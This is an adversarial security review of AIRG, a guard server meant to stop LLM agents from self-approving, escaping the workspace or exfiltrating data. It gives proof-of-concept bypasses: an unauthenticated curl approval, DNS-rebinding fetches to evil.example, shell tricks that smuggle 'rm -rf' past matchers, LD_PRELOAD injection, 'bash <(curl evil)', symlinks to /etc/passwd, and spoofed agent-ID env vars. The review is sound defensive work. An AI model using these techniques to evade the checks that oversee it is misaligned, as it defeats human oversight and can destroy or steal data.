AIRG Adversarial Security Review

 Scope: /Users/liviu/Documents/ai-runtime-guard @ branch dev, versions through 2.2.2 (2026-04-21).
 Posture: red-team — target AIRG's own stated guarantees.
 Verified against source: every file:line ref below was opened and confirmed. Some findings tagged (spec.) where the attack is
 plausible but the runtime-dependent factor (e.g., FS misconfiguration, client behavior) was not reproduced end-to-end.

 ---
 Context

 AIRG is a local MCP STDIO server + Flask control-plane that promises to mediate agent tool calls (execute / read / write / edit /
 delete / list / restore). It layers policy-tier resolution, Script Sentinel write/execute continuity, HMAC-signed approvals, and a
 GUI for policy and agent hardening. Users rely on AIRG to prevent an adversarial LLM agent from doing things it shouldn't —
 destructive commands, workspace escape, exfil, self-approval. This review asks: what does an agent (or a page the user visits in
 another tab) actually have to do to bypass those promises?

 The review spans three surfaces:
 1. Policy + Script Sentinel (policy_engine.py, script_sentinel.py, executor.py, tools/*).
 2. Local Web GUI (ui/backend_flask.py, ui/service.py).
 3. MCP / hook / persistence (server.py, airg_hook.py, approvals.py, telemetry.py, backup.py, config.py, mcp_config_manager.py).

 Architecture as Observed

 - MCP server: FastMCP, registers 8 tools (server.py:21-31). Runs STDIO; parent agent process sets env (AIRG_AGENT_ID, AIRG_WORKSPACE,
  AIRG_POLICY_PATH, AIRG_APPROVAL_HMAC_KEY_PATH, …).
 - Executor: executor.py:23-33 — subprocess.run(..., shell=True, executable="/bin/bash"). No ulimit/seccomp/cgroup. Env scrub filters
 only keys matching api_key|token|secret|password; IFS, LD_PRELOAD, LD_LIBRARY_PATH, DYLD_INSERT_LIBRARIES, PATH, PYTHONPATH, GIT_*
 are preserved.
 - Hook: airg_hook.py — pre-tool stdin/stdout hook binary consumed by Cursor/Claude clients. Env-driven identity
 (_extract_agent_id/_extract_workspace at airg_hook.py:69-86).
 - Flask backend: binds 127.0.0.1:$AIRG_FLASK_PORT (default 5001) (airg_cli.py:850). No auth middleware, no CSRF token, no Host header
  check. CORS is an @after_request hook that reflects any Origin starting with http://localhost or http://127.0.0.1
 (backend_flask.py:154-167).
 - Approvals: HMAC-signed, key at $APPROVAL_DB_PATH.hmac.key (override via AIRG_APPROVAL_HMAC_KEY_PATH), file mode 0600, ephemeral
 uuid4 fallback if key write fails (approvals.py:171-228).
 - Telemetry: endpoint read straight from policy.telemetry.endpoint with no allowlist (telemetry.py:145-147).
 - Restore: boundary-checks backup_path.is_relative_to(BACKUP_DIR) and is_within_workspace(source); manifest is plain JSON with no
 signature (tools/restore_tools.py:38-93).

 ---
 Findings by Severity

 CRITICAL

 ---
 C1. Local HTTP control-plane has zero authentication on state-changing endpoints
 src/ui/backend_flask.py:348-360 (/policy/apply), :417-452 (/approvals/approve), :455-487 (/approvals/deny), :555-568
 (/settings/agents/upsert), :664-695 (/settings/agents/mcp-apply), :698-723 (/settings/agents/config-apply), :758-807 (sentinel
 dismiss-once / trust).
 The only "actor" field is the optional X-Actor header (:356,424,461) which is informational. Any local process — including a second
 Claude Code session, a VSCode extension, a stray curl, or the very agent AIRG is supposed to be guarding — can POST JSON to
 127.0.0.1:5001 and overwrite policy, approve any pending command, allowlist sentinel content hashes, or rewrite MCP config.
 Undermines: the entire GUI-mediated approval boundary plus the v1.0.0 guarantee "Approval decisions remain out-of-band … preventing
 agent self-approval through MCP tools."
 PoC: curl -X POST http://127.0.0.1:5001/approvals/approve -H 'Content-Type: application/json' -d
 '{"token":"<scraped>","command":"<matching>"}'. Tokens can be scraped with one preceding GET /approvals/pending.
 Fix: require a shared secret per GUI session (generate on airg-ui start, print once to controlling terminal, store in 0600 token file
  under state dir, require Authorization: Bearer <token> on every non-OPTIONS request via a @app.before_request guard). Pair with
 same-origin Origin/Referer enforcement (C2) and a Host allowlist (C3). Treat every X-Actor header as untrusted until the bearer check
  passes.

 ---
 C2. CSRF / DNS-rebinding: no Host header check, Origin check reflects any http://localhost* or http://127.0.0.1* prefix
 src/ui/backend_flask.py:154-167. _is_local_origin is origin.startswith("http://localhost") or origin.startswith("http://127.0.0.1").
 This matches http://localhost.attacker.com and http://127.0.0.1.attacker.com — valid public hostnames an attacker can register. More
 importantly, the after_request hook reflects the origin back verbatim into Access-Control-Allow-Origin. Combined with the absence of
 a Host allowlist in Flask, the following DNS-rebinding attack works:
 1. User visits evil.example. First DNS answer = attacker IP, loads JS. TTL 0.
 2. Second DNS answer binds evil.example → 127.0.0.1.
 3. JS on that page calls fetch("http://evil.example:5001/approvals/pending", {credentials:"include"}). Browser sends Host:
 evil.example:5001. Flask serves. Response body reaches the attacker's page because the server echoes any localhost-prefixed ACAO
 (here evil.example doesn't match the prefix — so reads are blocked) but simple requests (form/text POSTs without custom headers)
 succeed regardless of CORS, and state-changing endpoints don't require read access.
 4. fetch("http://evil.example:5001/policy/apply", {method:"POST", body:"{…hostile policy…}", headers:{"Content-Type":"text/plain"}})
 — text/plain is a CORS-safelisted content-type so no preflight; Flask's request.get_json(silent=True) rejects non-JSON content-type,
 but the /settings/agents/open-file route is GET and any <img src="http://evil.example:5001/settings/agents/open-file?profile_id=…">
 tag fires. See C4.
 Undermines: operator sovereignty over policy / approvals.
 Fix: @app.before_request validate request.host against an allowlist (127.0.0.1:<port>, localhost:<port> only), and (after C1) require
  a bearer token that the browser gets from a same-origin script loaded at / — this cross-cuts DNS rebinding because an attacker page
 cannot read the token from a different origin.

 ---
 C3. Telemetry endpoint is operator-overridable to any URL → exfil channel once C1 is used
 src/telemetry.py:145-147 _telemetry_endpoint returns policy.telemetry.endpoint verbatim, falling back to the hard-coded default only
 when empty. validate_policy (see ui/service.py) checks the field is a string — not a URL scheme, not an allowlist.
 build_payload_from_paths is exposed unauthenticated at /telemetry/payload-preview (backend_flask.py:490-503). The payload itself is
 bucketed (low info), but the URL query string and hostname are under attacker control, and the payload is POST body, meaning an
 attacker who has chained C1 can (a) point AIRG at any HTTP endpoint and (b) include identifying data in URL path/query (e.g.,
 https://evil/leak?session=<id>). Also: urllib.request.urlopen() default TLS context is used — no cert pinning.
 Undermines: "Source of truth is policy" doc promise (AGENT_CONTEXT §5) is fine; the implicit promise that telemetry targets are
 constrained is not.
 Fix: hard-pin the telemetry endpoint at the runtime level (constant in telemetry.py, not policy-controlled) and collapse the GUI
 control to enable/disable only; OR retain the field but enforce an allowlist of known-safe hostnames (e.g.,
 {"telemetry.runtime-guard.ai"}) and reject anything else during validate_policy. Also: pin the TLS CA, strip redirects (urlopen → an
 opener without HTTPRedirectHandler).

 ---
 C4. restore_backup bypasses Script Sentinel and can plant attacker-authored files
 src/tools/restore_tools.py:38-182. Manifest is json.loads(manifest.json) with no HMAC. Source-path check is
 is_within_workspace(source) — meaning the destination is constrained to the workspace, but the agent, via write_file /
 execute_command, can construct a fake backup directory anywhere under BACKUP_DIR (or outside, then pass an absolute path — :33-37
 accepts absolute backup_location), populate it with a manifest.json mapping backup: /tmp/evil.sh → source: /workspace/innocent.sh,
 and then call restore_backup(dry_run=false, restore_token=<self-issued>). The restore uses shutil.copy2 (:161) — no write passes
 through write_file, so Script Sentinel never tags the restored content. On the next execute_command of that file, sentinel sees an
 untagged artifact and applies its fallback (which in match_original mode defers to base policy tier) — allow.

 Also: restore_token is consumed via AIRG itself (consume_restore_confirmation_token), and the token is issued by a prior dry_run=true
  call from the same process, so the agent self-issues the confirmation.
 Undermines: "Script Sentinel preserves policy intent for executed script artifacts" and the v1.0.0 "HMAC signed grants" promise.
 Fix: sign every entry in manifest.json at backup-creation time with the approval HMAC key (hash of source|backup|sha256|type); on
 restore, verify signatures against the key and reject any entry that fails. Additionally, route all restored file bytes through the
 Script Sentinel tagging path so restored scripts receive fresh tags. Deny restore when require_dry_run_before_apply is on but the
 dry-run happened in the same MCP session (keep the GUI-issued restore token the only path).

 ---
 C5. executor.py is a thin shell=True passthrough; any allowed tier command gains a full bash
 src/executor.py:23-33. No seccomp, no ulimit (prlimit not set), no pledge/landlock, no PATH scrub (see below), cwd=WORKSPACE_ROOT but
  the subshell can cd anywhere. safe_subprocess_env at :7-20 only filters env keys whose name contains api_key|token|secret|password —
  so OPENAI_API_KEY is stripped, but AIRG_APPROVAL_HMAC_KEY_PATH, AWS_SESSION_TOKEN (filtered), AWS_SECRET_ACCESS_KEY (filtered by
 "secret"), GITHUB_TOKEN (filtered), LD_PRELOAD / DYLD_INSERT_LIBRARIES / PYTHONPATH / GIT_SSH_COMMAND / IFS are all forwarded.
 Anything the tier system eventually lets through runs in a full /bin/bash -c with attacker-provided env from the parent.
 Undermines: the implicit "blocked commands stay blocked" guarantee when the agent decomposes into an allowed wrapper. Example chain:
 policy blocks rm -rf, but bash -c is allowed, so bash -c 'export LD_PRELOAD=/workspace/evil.so; env -i cat /etc/passwd' — or simpler,
  bash -c $'rm\\x20-rf\\x20/tmp' which bypasses token-level matchers because \x20 is resolved by the inner shell.
 Fix: (1) scrub the env to an allowlist (PATH, HOME, LANG, LC_ALL, TERM, USER, AIRG_*); explicitly drop LD_*, DYLD_*, PYTHONPATH,
 GIT_*SSH*, IFS. (2) Apply resource.setrlimit(RLIMIT_*) before exec (RSS, NOFILE, NPROC, CPU). (3) On macOS consider sandbox-exec with
  a minimal profile; on Linux, unshare --mount --net + seccomp filter. (4) Refuse LD_PRELOAD=... / IFS=... assignment tokens in the
 policy engine even when the rest of the command is "allowed".

 ---
 HIGH

 ---
 H1. agent_overrides keyed on un-authenticated AIRG_AGENT_ID → trivial impersonation
 src/airg_hook.py:69-76, src/config.py (agent_overrides resolution). The hook and runtime both read AIRG_AGENT_ID from env
 (_extract_agent_id). In STDIO MCP the parent agent owns the env. If any override under policy.agent_overrides relaxes enforcement for
  a profile (e.g., "default-agent" gets script_sentinel.mode=monitor), a hostile agent sets AIRG_AGENT_ID=default-agent at launch (or,
  worse, a subprocess re-invokes AIRG with a crafted env) and inherits the looser posture.
 AGENT_CONTEXT §2 flags this as a limitation ("identity separation is profile/env based… not authenticated per-instance identity"),
 but a limitation isn't the same as being safe — any override policy today is load-bearing for the security story.
 Fix: make agent_overrides strict-by-default: overrides may only tighten, never loosen, baseline enforcement. Parse-time reject any
 override that turns a blocked into requires_confirmation/allowed, lowers a sentinel mode, or disables network/containment. Document
 the env-based id as "for bookkeeping only" and show a warning banner in the GUI when overrides exist.

 ---
 H2. PATH-hijack of airg-server when generating MCP config
 src/agent_configs.py:189-220, src/mcp_config_manager.py:138-165, src/agent_configurator.py:137-163, src/airg_cli.py:356-386. All four
  resolution paths have the same pattern: try env override → venv bin → sibling of sys.executable → shutil.which("airg-server") → fall
  back to f"{current_python} -m airg_cli server". The intermediate shutil.which result is not rejected if the hit lives in a
 user-writable directory. An attacker who can drop ~/bin/airg-server (or any PATH entry earlier than the real one) owns the MCP server
  process every time a client spawns it. Given the v1.1.0 changelog notes that Linux installs had PATH ambiguity issues, this is not
 hypothetical.
 Fix: always materialize the absolute path of the current interpreter and emit {"command": sys.executable, "args": ["-m", "airg_cli",
 "server"]} into generated MCP configs. Never emit the bare airg-server string. On apply, verify the resolved executable is inside a
 system-owned directory (/usr/local/…, /opt/homebrew/…, or the venv of the current process) and refuse otherwise with a clear error.

 ---
 H3. Policy blocked.paths uses lowercase substring match — trivially bypassed by quoted splits
 src/policy_engine.py:549-554. for path in blocked.get("paths", []): if path.lower() in lower: …. The lower variable is
 command.lower() on the raw command string, so quoting-induced gaps defeat it:
 - cat "/state/airg/a""pprovals.db" — lowercased raw contains a""pprovals.db, no substring match for approvals.db.
 - cat /state/airg/approv${x:-}als.db with x="" — same idea.
 - cat "$HOME/.l"ocal/state/airg/activity.log — fine (activity.log still present) but rename/move tricks via ln first, then read the
 symlink by a benign name, defeat any textual check.

 The token-based matcher (build_command_matcher, :503-535) is stronger for blocked.commands, but blocked.paths does not use it.
 Undermines: "runtime-state path protections for activity.log, approvals.db, and HMAC key paths" (v1.0.0 changelog) — those
 protections are currently stringly-typed.
 Fix: resolve every candidate path token (reuse _resolve_candidate_path), then compare resolved absolute paths against a canonicalized
  blocked-path set (each entry expanded to its absolute form). Additionally, keep a hard-coded denylist of AIRG-internal artifacts
 (HMAC key, approvals.db, reports.db, policy.json, activity.log, BACKUP_DIR) that is not overridable by policy.

 ---
 H4. Script Sentinel evasions left after v2.0 tagging flow
 src/script_sentinel.py (full module).
 - Out-of-band mutation: sentinel tags content by sha256 at write time; if the agent write_file's a benign script, then uses
 execute_command to sed -i / printf >> file / cat >> file it, the new content has a new hash, so sentinel's lookup by path misses
 (path not mapped to new hash) → falls back to base policy. This is the specifically-advertised threat model and the primary sentinel
 is blind to it unless match_original is configured with tagging-on-overwrite.
 - Concatenation: cat /ws/benign.sh /ws/malicious.sh | bash — sentinel's per-file tag doesn't compose.
 - Process substitution pipe-to-shell: bash <(curl evil) / bash <(sed 's/x/y/' tagged.sh).
 - Rename / hardlink / copy: cp tagged.sh run.sh && bash run.sh — new path not in sentinel's path→hash map.
 - Indirect interpreter: python -c "$(cat tagged.sh)" — interpreter sees bytes; sentinel's _first_script_arg detects positional file
 args, not -c payloads.
 - Restore bypass: see C4 above (shutil.copy2 writes without write_file).
 Undermines: the "policy-intent continuity" headline feature (v2.0.0).
 Fix: two-layer. (a) At execute_command time, scan every file-argument and every -c/-e/--eval argument content; hash on read and check
  against sentinel's store. (b) Add the "overwrite re-tags" mode that was promised but is absent in current code — when any AIRG tool
 re-writes a previously-tagged path, mark the old tag as stale and require re-approval for the new hash. (c) Hook write/read at the FS
  layer by keeping a watch on the workspace (inotify/FSEvents) so out-of-band modifications via sed -i / echo >> are caught even when
 the agent bypasses AIRG tools.

 ---
 H5. Shell parser gaps exposed in execute_command tier resolution
 src/policy_engine.py tokenizer + substitution extractor. v2.1.0 patched $(...), `...`, <(...), >(...) — but the following still pass:
 - ANSI-C quoting: echo $'\\x72m\\x20-rf\\x20/tmp' — the resolved bytes are rm -rf /tmp, but the token matcher sees
 $'\x72m\x20-rf\x20/tmp'.
 - Brace expansion: r{m,f} -rf /tmp → shell expands to rm -rf /tmp; shlex.split does not expand braces.
 - Here-doc / here-string: bash <<< "rm -rf /tmp", bash <<EOF\nrm -rf /tmp\nEOF.
 - exec -c "…" / bash -c "…" / python -c "…" / perl -e "…": when the outer command is allowed, the -c body is never tier-checked.
 (Script Sentinel also misses it per H4.)
 - Indirection: c=rm; $c -rf /tmp; ${!x}.
 - Case folding: build_command_matcher lowercases; the command runs under bash which is case-sensitive. But policy path .env matches
 substring .env in any casing. On macOS the FS is often case-insensitive, so .ENV opens the same file; no bypass here but worth
 testing.
 - Unicode homoglyphs: ⅽurl evil (Roman Numeral ⅽ = U+217D) — shlex/re treat as distinct codepoint; bash does not parse this as curl
 either, so this one is non-issue; noted only because the prior agent flagged it.
 - Env-assigned prefixes: IFS=$'\\n' cmd args — tokenizer sees leading IFS= as an assignment, subsequent matcher may miss that the
 effective argv is reshaped when interpreted by bash.
 Undermines: the v2.1.0 "substitution bypass prevention" regression coverage is incomplete for the broader class.
 Fix: (a) reject -c/-e/--eval arguments unless their payload also passes policy checks (recursive tier resolution of the inner text).
 (b) Expand brace and here-doc content before tokenization (shell-aware wrapper around shlex). (c) Reject tokens that syntactically
 match assignment-prefix forms (IFS=, LD_*=, PATH=) unless explicitly allowed. (d) Add regression tests mirroring each bullet above
 under tests/test_command_substitution_policy.py.

 ---
 H6. Symlink fabrication via execute_command → workspace-containment and path-blocking bypass
 src/policy_engine.py:389-393 (_resolve_candidate_path uses pathlib.Path.resolve() which follows symlinks). is_within_workspace at
 :635-644 resolves then prefix-checks. If ln is allowed (it is, by default — no block pattern for it), the agent can:
 1. execute_command("ln -s /etc/passwd /workspace/pw")
 2. read_file("/workspace/pw") → AIRG's read_file path check will see the link target only if it resolves, depending on file_tools.py
 handling. If it does not resolve prior to the blocked-paths check, substring /etc/passwd is absent in the resolved argument and the
 read succeeds.
 Even if read_file resolves, the first step still pollutes the workspace with attacker-chosen targets.
 Fix: make execute_command's containment check and file_tools path checks both lstat-aware: reject tokens whose lexical path lies
 inside the workspace but whose resolved target lies outside. Additionally, block ln -s / cp -l to/from the workspace in the default
 policy, or treat symlink creation as requires_confirmation.

 ---
 H7. Log injection via command field → activity.log / reports.db forensics poisoning
 src/audit.py (append helpers), src/airg_hook.py:115-122, src/reports.py:265-277. activity.log is line-delimited JSON.
 has_shell_unsafe_control_chars (policy_engine.py:499-500) blocks \x00\n\r only at the execute_command entry point, in the command
 text. Other fields — affected_paths, matched_rule, extra payload — are not checked. json.dumps will escape newlines inside strings,
 so a direct newline in a command field is encoded. BUT: if an attacker can get any string through that later gets appended without
 json.dumps (e.g., hook's _append_log at airg_hook.py:119-120 always uses json.dumps — that's safe), log injection is actually hard
 here.
 The real issue is the inverse: reports.py ingest trusts any JSON line in activity.log. If the agent can write to activity.log
 directly via write_file (blocked by default since "activity.log" is in blocked.paths — see H3 for the substring-match weakness), it
 can inject forged policy_decision: allowed events and poison dashboards / mislead operator triage.
 Fix: (a) store activity.log outside the workspace and outside any allowed-paths (currently the default already stores it under
 ~/.local/state/airg or ~/Library/Application Support/ai-runtime-guard/, which is good); (b) add a sequence number + HMAC per log
 line; reports ingest verifies the MAC and drops rows that don't match; (c) fix H3 so the substring blocklist can't be dodged.

 ---
 H8. open-file GET endpoint is a CSRF-reachable side effect
 src/ui/backend_flask.py:616-627 (/settings/agents/open-file). GET with side effect (opens a file via the OS). Any malicious page the
 user visits can issue <img src="http://127.0.0.1:5001/settings/agents/open-file?profile_id=default-agent"> and cause the user's
 desktop to open whatever the implementation resolves. Even without C1/C2 auth, the GET form means no preflight is triggered.
 Fix: convert to POST + bearer token (C1). If kept as GET, at minimum check the Origin/Referer and reject non-same-origin.

 ---
 MEDIUM

 ---
 M1. Approval HMAC key path is env-overridable — src/approvals.py:171-175 (AIRG_APPROVAL_HMAC_KEY_PATH). If an adversarial parent
 controls env, it can point AIRG at its own key file and forge approval_grant_signature. Mitigated by default file mode 0600 and
 warning when weak — but once the agent can write to the key path, forgery is silent. Fix: on start, verify the key path is inside a
 known state dir (~/.local/state/airg, macOS Application Support equivalent) and refuse overrides that live inside the workspace or
 under /tmp.

 M2. Approval HMAC fallback to ephemeral uuid4 key is silent — src/approvals.py:219-228. If the key file is unwritable, AIRG continues
  with uuid4().hex in memory and logs a warning, which the operator may miss. Approvals still work within the process lifetime, so
 monitoring misses the degraded state. Fix: fail-closed: raise and refuse approval minting when the persistent key cannot be written;
 surface as a hard banner in the GUI.

 M3. AIRG_WORKSPACE env is unauthenticated and expands "within-workspace" checks — src/airg_hook.py:79-86, src/config.py. Spoofing
 AIRG_WORKSPACE=/ makes every path "inside workspace." Fix: pin the workspace to what's stored in the default-agent profile on the
 server side; refuse or warn when the env value disagrees with the registered profile.

 M4. AIRG_AGENT_SESSION_ID env takes priority over structured session ids — src/airg_hook.py:52-66. An agent can fabricate a session
 id, causing audit events to be attributed to a non-existent session. Fix: prefer context-derived session id; use env only as last
 resort, and log a warning on divergence.

 M5. CORS prefix matcher accepts http://localhost.evil.com — src/ui/backend_flask.py:154-155. Even without DNS rebinding, an attacker
 who can get the user to visit a subdomain they control (e.g., via a short link) picks up full CORS access, making reads of AIRG's API
  possible. Fix: exact match on {http://localhost:<port>, http://127.0.0.1:<port>}.

 M6. /reports/* endpoints accept ?sync=true with side effects via GET — src/ui/backend_flask.py:243-266 and peers. Not
 security-critical on its own, but CSRF-reachable from <img> tags. Fix: require POST or move the sync trigger behind the bearer token
 (C1).

 M7. Policy blocked.extensions is regex-based and catchable only for plain tokens — src/policy_engine.py:556-559
 (re.search(rf"{re.escape(ext)}\b", lower)). Doesn't detect the extension as a file target vs a literal substring. echo ".pem is just
 a string" will trigger a block; python -c "open('key.pem')" will not. Fix: route through resolved path tokens instead of raw command
 substring.

 M8. Restore with no expected_hash is allowed — src/tools/restore_tools.py:154-159. If the manifest entry lacks sha256, no integrity
 check. Backup creation always records a hash today, but a crafted manifest omits it. Fix: require sha256 on every entry and reject
 restore otherwise (combine with C4's manifest signature).

 M9. Backup creation is_within_workspace is undermined by M3 workspace spoofing — src/backup.py (source-path check before copy). Fix:
 as M3.

 M10. Default policy blocked.paths is too narrow — policy.json.defaults:55-63 lists only .env, .ssh, /etc/passwd, and the AIRG state
 files. Missing: /etc/shadow, /etc/sudoers, ~/.aws/credentials, ~/.docker/config.json, ~/.kube/config, ~/Library/Keychains/*,
 ~/.config/gcloud, ~/.git-credentials, browser profile dirs, SSH known_hosts tamper paths. Agent reads these via cat are allowed. Fix:
  expand the default list, and pair with the resolved-path matcher from H3.

 M11. execute_command retry counter is memory-only and keyed on command hash — src/policy_engine.py:482-497, SERVER_RETRY_COUNTS:
 dict. An adversarial agent varies the command by a comment / whitespace to reset the retry count and brute-force toward approval
 acceptance. Fix: key retries on (session_id, normalized_command_token_set) and persist across restarts if this counter is
 load-bearing.

 M12. Network policy depends on string-level domain extraction — per AGENT_CONTEXT §2. Forms that defeat it: IP literals (curl
 93.184.216.34), decimal IP (curl 1560824910), curl --resolve host:80:93.184.x.x http://host/, /dev/tcp/host/port bash redirection,
 ssh user@host -- cmd, git clone git@attacker.com:x. Fix: drop the curl/wget-centric approach; instead, network-namespace the executor
  (unshare --net + local proxy with domain allowlist) so all egress flows through an allowlisted HTTP(S) forward proxy regardless of
 command form.

 M13. /telemetry/payload-preview is unauthenticated — src/ui/backend_flask.py:490-503. Payload is bucketed and not sensitive, but it
 reveals AIRG version, installed agent types, and rough activity magnitude. Useful reconnaissance. Fix: bearer token (C1).

 M14. Flask default WSGI server is used in production — airg_cli.py:920 app.run(…, debug=False, use_reloader=False). Werkzeug's dev
 server is single-threaded and not hardened. If anything ever exposes this beyond loopback, it's brittle. Fix: run under waitress /
 gunicorn on loopback; keep loopback-only.

 ---
 LOW

 ---
 L1. catalog.json / policy.json validation rejects only shape, not semantics — an operator pushing a catastrophically loose policy
 (empty blocked, script_sentinel.mode=off) succeeds silently. Fix: warn on apply when the new policy is materially looser than the
 current one; require an explicit confirm_loosen: true flag.

 L2. ui_spa fallback serves any existing file under UI_DIST_PATH — src/ui/backend_flask.py:836-846. send_from_directory blocks .., so
 path traversal doesn't cross the dist boundary, but placing sensitive content in UI_DIST_PATH would expose it. Current dist is built
 assets only — OK. Flag as future-proofing. Fix: allowlist file extensions served by the fallback.

 L3. shlex.split-based tokenizer silently skips segments on parse error — src/policy_engine.py:412-413 if err: continue. Malformed
 shell deliberately crafted to fail tokenization (unbalanced quotes, unterminated command substitution) skips the containment check
 for that segment. Combined with ; / && segment splitting, the agent can hide payloads behind a parse-error segment. Fix: on tokenize
 error, fail-closed (treat as blocked) or fall back to a stricter regex-based scanner for that segment.

 L4. SCRIPT_SENTINEL_TRUST endpoint (backend_flask.py:785-807) marks content by hash, not by (agent, workspace, hash) — a trust grant
 applied by the operator for one agent/workspace scope propagates across all profiles that share AIRG's sentinel DB. Fix: key
 allowances on (agent_id, content_hash) and refuse cross-profile matches.

 L5. X-Actor header is logged as the approver identity — backend_flask.py:424,461. Any local process pretends to be "admin" in audit
 logs. Informational only after C1 lands (bearer token authenticates; X-Actor becomes optional display). Fix: stop honoring X-Actor
 unauthenticated; derive actor from the bearer token's binding.

 L6. execute_command cwd is fixed at WORKSPACE_ROOT but subshells cd freely — expected, but worth documenting as "cwd containment is
 advisory, not enforced." Fix: doc; or enforce via the executor's namespace/sandbox (see C5).

 L7. Reports DB query filters are passed through to reports.list_events — backend_flask.py:221-240. Assuming that module
 parameterizes, no SQLi; worth a unit test that constructs an adversarial filter string. Fix: add a regression test.

 L8. Dev-mode Flask CORS leaks Access-Control-Allow-Methods and Allow-Headers even when origin doesn't match —
 backend_flask.py:165-166. Minor info leak; enumerates API shape. Fix: emit CORS headers only inside the origin-matched branch.

 ---
 Undermined Guarantees — explicit call-outs

 ┌──────────────────────────────────────────────────────────┬─────────────────────────────────────────────────────────────────────┐
 │                        AIRG Claim                        │                     Findings that undermine it                      │
 ├──────────────────────────────────────────────────────────┼─────────────────────────────────────────────────────────────────────┤
 │ Policy is the source of truth / only GUI can change it   │ C1, C2 (anyone reaching 127.0.0.1:5001 rewrites policy)             │
 ├──────────────────────────────────────────────────────────┼─────────────────────────────────────────────────────────────────────┤
 │ Approvals are out-of-band, agents cannot self-approve    │ C1 (any local process POSTs approve), C4 (self-issued restore       │
 │ (v1.0.0)                                                 │ confirmation), M1/M2 (HMAC key compromise paths)                    │
 ├──────────────────────────────────────────────────────────┼─────────────────────────────────────────────────────────────────────┤
 │ Script Sentinel preserves policy intent for tagged       │ H4 (five documented bypass classes), C4 (restore bypasses sentinel) │
 │ artifacts (v2.0.0)                                       │                                                                     │
 ├──────────────────────────────────────────────────────────┼─────────────────────────────────────────────────────────────────────┤
 │ Substitution bypass prevention (v2.1.0)                  │ H5 (ANSI-C, brace, here-doc, -c, indirection still unhandled)       │
 ├──────────────────────────────────────────────────────────┼─────────────────────────────────────────────────────────────────────┤
 │ Runtime-state path protections for                       │ H3 (substring-match can be split by quoting)                        │
 │ activity.log/approvals.db/HMAC key (v1.0.0)              │                                                                     │
 ├──────────────────────────────────────────────────────────┼─────────────────────────────────────────────────────────────────────┤
 │ Telemetry runtime control is policy/GUI-driven (v2.2.0)  │ C3 (policy-driven endpoint is an exfil vector when policy is        │
 │                                                          │ unauth)                                                             │
 ├──────────────────────────────────────────────────────────┼─────────────────────────────────────────────────────────────────────┤
 │ Shell workspace containment is enforceable               │ H6 (symlink fabrication), L3 (parse-error skip), M3 (env spoof)     │
 └──────────────────────────────────────────────────────────┴─────────────────────────────────────────────────────────────────────┘

 Remediation Priorities (order-of-operations suggestion)

 1. C1 + C2 + C3 together — they compose: fixing auth without fixing rebinding leaves the bearer token phishable by a page that
 already speaks to the server; fixing telemetry without fixing auth leaves the policy rewrite open.
 2. C5 — harden the executor; most other findings lose teeth once the effective shell is constrained.
 3. H1, H3, H6, C4 — identity/paths/restore form the "ground truth" layer that every other guarantee sits on.
 4. H4, H5 — Sentinel and shell parser: structural gaps, large test surface.
 5. H2, H7, H8, M1–M14, L1–L8 — clean up.

 Verification Plan

 - Unit: extend tests/test_attacker_suite.py with one test per finding above. Each test sets up the specific bypass condition and
 asserts AIRG refuses. Structure by ID (test_C1_policy_apply_requires_auth, test_H5_ansi_c_quoting_blocked, …).
 - Integration: script pytest + a Flask test client that simulates the DNS-rebinding / CSRF scenarios (custom Host and Origin
 headers).
 - Live end-to-end: start airg-ui, fire curl against each endpoint without the bearer token; confirm 401. Re-fire with the token;
 confirm 2xx.
 - Fuzz: shell-parser hardening deserves a grammar fuzzer (e.g., hypothesis strategy over shell constructs) run against
 policy_engine.check_command_policy to surface further parser gaps.
 - Red-team rehearsal: have a separate agent session attempt each of C1–C5 against a real AIRG install; capture the session transcript
  as a regression artifact.

 Critical Files (to touch when implementing fixes)

 - src/ui/backend_flask.py — auth middleware, Host/Origin guard, CORS tightening.
 - src/executor.py — env scrub + rlimits + optional sandbox-exec/unshare.
 - src/policy_engine.py — tokenizer hardening, resolved-path blocklist, -c recursion.
 - src/script_sentinel.py — overwrite-retag, -c content scan, FS-watch hook.
 - src/tools/restore_tools.py + src/backup.py — manifest signing / verification.
 - src/telemetry.py — endpoint allowlist / pin.
 - src/approvals.py — HMAC key path allowlist, fail-closed fallback.
 - src/airg_hook.py — env precedence, fail-closed on exception.
 - src/mcp_config_manager.py + src/agent_configs.py + src/agent_configurator.py + src/airg_cli.py — absolute-path server command
 emission.
 - policy.json.defaults — expanded blocked.paths.
 - tests/test_attacker_suite.py — full regression coverage matching each finding ID.